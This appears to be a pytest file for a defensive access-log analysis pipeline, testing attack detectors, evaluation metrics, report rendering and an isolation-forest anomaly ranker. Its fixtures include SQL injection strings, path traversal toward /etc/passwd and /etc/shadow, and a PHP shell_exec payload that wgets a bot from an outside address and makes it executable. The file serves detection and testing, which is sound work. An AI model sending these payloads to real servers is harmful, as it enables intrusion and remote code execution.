"""Unit tests for feature extraction, detectors, evaluation, and the report."""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any
from urllib.parse import unquote

import pyarrow as pa
import pyarrow.parquet as pq
import pytest

from phase3_analyze.consistency import ConsistencyCheck, ConsistencyResult
from phase3_analyze.timeline import TimelineResult
from phase4_detect.detectors import DetectorConfig, run_detectors
from phase4_detect.evaluate import LabelError, evaluate_detections, load_labels
from phase4_detect.features import (
    RequestFeatures,
    extract_request_features,
    summarize_clients,
)
from phase4_detect.isolation_forest import IsolationForestConfig, run_isolation_forest
from phase4_detect.report import build_report, render_markdown

BASE = datetime(2026, 11, 11, 12, 0, 0, tzinfo=UTC)


def req(
    uri: str,
    *,
    seconds: float = 0.0,
    method: str = "GET",
    status: int = 200,
    client: str = "10.0.0.1",
    line: int = 1,
    trace: str | None = None,
) -> RequestFeatures:
    """Build a request the way the extractor would, from a raw URI."""
    raw_path, _, raw_query = uri.partition("?")
    path_decoded = unquote(raw_path)
    return RequestFeatures(
        artifact_path="artifacts/0000-access.log",
        line_no=line,
        byte_offset=line * 100,
        trace_id=trace,
        ts=BASE + timedelta(seconds=seconds),
        remote_addr=client,
        method=method,
        uri_raw=uri,
        path=raw_path,
        path_decoded=path_decoded,
        query_decoded=unquote(raw_query),
        status=status,
        user_agent="ua",
        path_depth=len([part for part in path_decoded.split("/") if part]),
        query_length=len(raw_query),
        encoded_char_count=uri.count("%"),
        user_agent_empty=False,
    )


def classes(uri: str, **kwargs: Any) -> set[str]:
    return {d.attack_class for d in run_detectors([req(uri, **kwargs)])}


# ---------------------------------------------------------------- detectors


@pytest.mark.parametrize(
    ("uri", "expected"),
    [
        ("/.git/config", "path_scan"),
        ("/.env", "path_scan"),
        ("/wp-admin/", "path_scan"),
        ("/phpmyadmin/index.php", "path_scan"),
        ("/server-status", "path_scan"),
        ("/backup.zip", "path_scan"),
        ("/search?q=%27+OR+%271%27%3D%271", "sqli_like"),
        ("/search?q=1+UNION+SELECT+a,b+FROM+users", "sqli_like"),
        ("/search?q=%27%3B+DROP+TABLE+t%3B+--", "sqli_like"),
        ("/search?q=1%20AND%20SLEEP(5)", "sqli_like"),
        ("/%2e%2e/%2e%2e/etc/passwd", "traversal"),
        ("/download?file=..%2f..%2fetc%2fshadow", "traversal"),
        ("/download?file=%252e%252e%252fsecret", "traversal"),
        ("/files?name=..%5cwindows", "traversal"),
    ],
)
def test_signature_detectors_fire(uri: str, expected: str) -> None:
    assert expected in classes(uri)


@pytest.mark.parametrize(
    "uri",
    [
        "/",
        "/index.html",
        "/assets/site.css?session=2209",
        "/search?q=union+station+schedule",
        "/search?q=select+a+size",
        "/blog/how-to-backup-your-data",
        "/docs/etc-passwd-explained",
        "/search?q=O%27Brien",
        "/archive/2026/11/report.pdf",
        "/missing-benign",
    ],
)
def test_benign_requests_are_not_flagged(uri: str) -> None:
    assert classes(uri, status=404) == set()


def test_brute_force_needs_a_burst_of_login_posts() -> None:
    four = [req("/login", method="POST", seconds=i, line=i + 1) for i in range(4)]
    five = [req("/login", method="POST", seconds=i, line=i + 1) for i in range(5)]
    assert run_detectors(four) == []
    detections = run_detectors(five)
    assert {d.attack_class for d in detections} == {"brute_force"}
    assert len(detections) == 5


def test_brute_force_ignores_get_slow_attempts_and_other_clients() -> None:
    gets = [req("/login", seconds=i, line=i + 1) for i in range(8)]
    slow = [req("/login", method="POST", seconds=i * 120, line=i + 1) for i in range(8)]
    mixed = [
        req("/login", method="POST", seconds=i, line=i + 1, client=f"10.0.0.{i}")
        for i in range(8)
    ]
    assert run_detectors(gets) == []
    assert run_detectors(slow) == []
    assert run_detectors(mixed) == []


def test_enumeration_flags_numbered_missing_resources_below_any_rate() -> None:
    probes = [req(f"/hidden-{i:02d}", seconds=i * 600, status=404, line=i + 1) for i in range(1, 6)]
    detections = run_detectors(probes)
    assert {d.attack_class for d in detections} == {"low_slow"}
    assert len(detections) == 5


def test_enumeration_ignores_existing_resources_and_repeated_misses() -> None:
    existing = [req(f"/img{i}.png", seconds=i, status=200, line=i + 1) for i in range(1, 8)]
    repeated = [req("/hidden-01", seconds=i, status=404, line=i + 1) for i in range(1, 8)]
    assert run_detectors(existing) == []
    assert run_detectors(repeated) == []


def test_enumeration_window_is_configurable() -> None:
    probes = [req(f"/hidden-{i}", seconds=i * 600, status=404, line=i) for i in range(1, 6)]
    tight = DetectorConfig(enumeration_window_seconds=900.0)
    assert run_detectors(probes, tight) == []


def test_detections_are_deterministic_and_carry_row_references() -> None:
    rows = [req("/.env", line=2, seconds=1, trace="t2"), req("/.git/config", line=1, trace="t1")]
    first = run_detectors(rows)
    assert first == run_detectors(list(reversed(rows)))
    refs = [(d.line_no, d.byte_offset, d.trace_id) for d in first]
    assert refs == [(1, 100, "t1"), (2, 200, "t2")]


# ----------------------------------------------------------------- features


def _write_access(path: Path, rows: list[dict[str, Any]]) -> None:
    names = [
        "artifact_path", "line_no", "byte_offset", "trace_id", "ts_utc", "remote_addr", "method",
        "uri_raw", "path", "path_decoded", "query_decoded", "status", "user_agent", "parse_ok",
    ]
    columns = {name: [row.get(name) for row in rows] for name in names}
    pq.write_table(pa.table(columns), path)


def _access_row(line: int, uri: str, **overrides: Any) -> dict[str, Any]:
    raw_path, _, raw_query = uri.partition("?")
    row: dict[str, Any] = {
        "artifact_path": "artifacts/0000-access.log",
        "line_no": line,
        "byte_offset": line * 10,
        "trace_id": f"t{line}",
        "ts_utc": f"2026-11-11T12:00:{line:02d}.000000Z",
        "remote_addr": "10.0.0.1",
        "method": "GET",
        "uri_raw": uri,
        "path": raw_path,
        "path_decoded": unquote(raw_path),
        "query_decoded": unquote(raw_query) if raw_query else None,
        "status": 404,
        "user_agent": "ua",
        "parse_ok": True,
    }
    row.update(overrides)
    return row


def test_extract_features_skips_unparsed_and_untimed_rows(tmp_path: Path) -> None:
    _write_access(
        tmp_path / "access.parquet",
        [
            _access_row(1, "/a"),
            _access_row(2, "/b", parse_ok=False),
            _access_row(3, "/c", ts_utc=None),
            _access_row(4, "/d?x=%2e", trace_id="-"),
        ],
    )
    features = extract_request_features(tmp_path)
    assert [f.line_no for f in features] == [1, 4]
    assert features[1].trace_id is None
    assert features[1].encoded_char_count == 1
    assert features[0].ts.tzinfo is not None


def test_extract_features_requires_the_access_table(tmp_path: Path) -> None:
    with pytest.raises(FileNotFoundError):
        extract_request_features(tmp_path)


def test_client_summaries_aggregate_per_address() -> None:
    rows = [
        req("/a", client="1.1.1.1", status=404, line=1),
        req("/b", client="1.1.1.1", status=404, line=2, seconds=5),
        req("/b", client="1.1.1.1", status=200, line=3, seconds=9),
        req("/a", client="2.2.2.2", status=200, line=4),
    ]
    first, second = summarize_clients(rows)
    assert (first.remote_addr, first.requests, first.distinct_paths) == ("1.1.1.1", 3, 2)
    assert first.distinct_404_paths == 2
    assert first.client_error_ratio == pytest.approx(2 / 3)
    assert second.client_errors == 0


# --------------------------------------------------------------- evaluation


def test_evaluation_scores_per_class_and_overall() -> None:
    rows = [
        req("/.env", line=1, trace="a", status=404),
        req("/.git/config", line=2, trace="b", status=404),
        req("/", line=3, trace="c"),
        req("/search?q=1+UNION+SELECT+x", line=4, trace="d"),  # labelled benign: false positive
        req("/.env", line=5, trace=None),  # unjoinable, but flagged
    ]
    labels = {"a": "path_scan", "b": "sqli_like", "c": "benign", "d": "benign", "z": "traversal"}
    report = evaluate_detections(rows, run_detectors(rows), labels).report
    assert report["labelled_rows"] == 4
    assert report["labels_without_joined_row"] == 1
    assert report["unjoined_trace_ids"] == ["z"]
    assert report["rows_without_trace_id"] == 1
    assert report["rows_without_trace_id_flagged"] == 1
    overall = report["overall_attack_vs_benign"]
    # Row "b" is a labelled attack that was flagged, though as the wrong class.
    assert (overall["true_positives"], overall["false_positives"]) == (2, 1)
    assert (overall["false_negatives"], overall["true_negatives"]) == (0, 1)
    path_scan = report["per_class"]["path_scan"]
    assert (path_scan["precision"], path_scan["recall"]) == (0.5, 1.0)
    sqli = report["per_class"]["sqli_like"]
    assert sqli["false_negatives"] == 1
    assert sqli["false_positives"] == 1
    assert {d["trace_id"] for d in report["disagreements"]} == {"b", "d"}


def test_evaluation_with_no_data_has_undefined_not_zero_metrics() -> None:
    report = evaluate_detections([], [], {}).report
    assert report["overall_attack_vs_benign"]["precision"] is None
    assert report["per_class"]["traversal"]["f1"] is None


def test_load_labels_validates_input(tmp_path: Path) -> None:
    good = tmp_path / "good.jsonl"
    good.write_text('{"trace_id":"a","class":"benign"}\n\n{"trace_id":"b","class":"sqli_like"}\n')
    assert load_labels(good) == {"a": "benign", "b": "sqli_like"}
    for name, text in {
        "dup": '{"trace_id":"a","class":"x"}\n{"trace_id":"a","class":"y"}\n',
        "bad": "not json\n",
        "shape": '{"trace_id":1,"class":"x"}\n',
        "list": "[1]\n",
    }.items():
        path = tmp_path / f"{name}.jsonl"
        path.write_text(text)
        with pytest.raises(LabelError):
            load_labels(path)


# ------------------------------------------------------------------- report


def _sample_report(evaluation: dict[str, Any] | None = None) -> dict[str, Any]:
    rows = [req("/.env", line=1, trace="a", status=404)]
    consistency = ConsistencyResult("eid", (ConsistencyCheck("clock_skew", "pass", "ok"),))
    return build_report(
        case_id="C001",
        evidence_id="eid",
        generated_utc="2026-11-11T12:00:00Z",
        manifest={"target": {"hostname": "h", "address": "a"}, "acquirer": {"operator": "me"}},
        parse_report={"total_bytes": 10, "total_lines": 1, "parsed_lines": 1, "unparsed_lines": 0},
        consistency=consistency,
        timeline=TimelineResult(events=(), unparsed_count=0, gaps=()),
        clients=summarize_clients(rows),
        detections=run_detectors(rows),
        detector_config=DetectorConfig(),
        evaluation=evaluation,
    )


def test_report_is_json_serialisable_and_lists_findings_and_limitations() -> None:
    report = _sample_report()
    json.dumps(report)
    assert report["total_detections"] == 1
    assert report["findings"][0]["attack_class"] == "path_scan"
    assert report["limitations"]
    assert report["evaluation"] is None


def test_report_markdown_has_each_section_and_no_evaluation_when_unlabelled() -> None:
    text = render_markdown(_sample_report())
    for heading in ("## Acquisition", "## Consistency checks", "## Findings", "## Limitations"):
        assert heading in text
    assert "Detector evaluation" not in text
    assert "`/.env`" in text


def test_report_markdown_includes_evaluation_when_given() -> None:
    rows = [req("/.env", line=1, trace="a", status=404)]
    evaluation = evaluate_detections(rows, run_detectors(rows), {"a": "path_scan"}).report
    text = render_markdown(_sample_report(evaluation))
    assert "Detector evaluation" in text
    assert "| path_scan | 1.0 | 1.0 | 1.0 |" in text


def test_isolation_forest_ranks_outlier_above_normal_traffic() -> None:
    normal = [
        req(
            f"/product/{100 + (i % 5)}",
            seconds=i * 10,
            status=200,
            client=f"10.0.0.{i % 4}",
            line=i + 1,
        )
        for i in range(40)
    ]
    outlier = req(
        "/index.php?s=/index/invokefunction&function=call_user_func_array&vars[0]=shell_exec"
        "&vars[1][]='wget http://198.51.100.1/bot; chmod 777 /tmp/bot'",
        seconds=500,
        status=400,
        client="198.51.100.99",
        line=41,
    )
    rows = [*normal, outlier]
    first = run_isolation_forest(rows, IsolationForestConfig(n_trees=60, seed=42))
    second = run_isolation_forest(rows, IsolationForestConfig(n_trees=60, seed=42))
    assert first.all_scores == second.all_scores
    assert first.anomalies[0].line_no == 41
    assert first.anomalies[0].anomaly_score > first.score_median


def test_isolation_forest_handles_empty_input() -> None:
    empty = run_isolation_forest([])
    assert empty.total_scored == 0
    assert empty.anomaly_count == 0
    assert empty.anomalies == ()
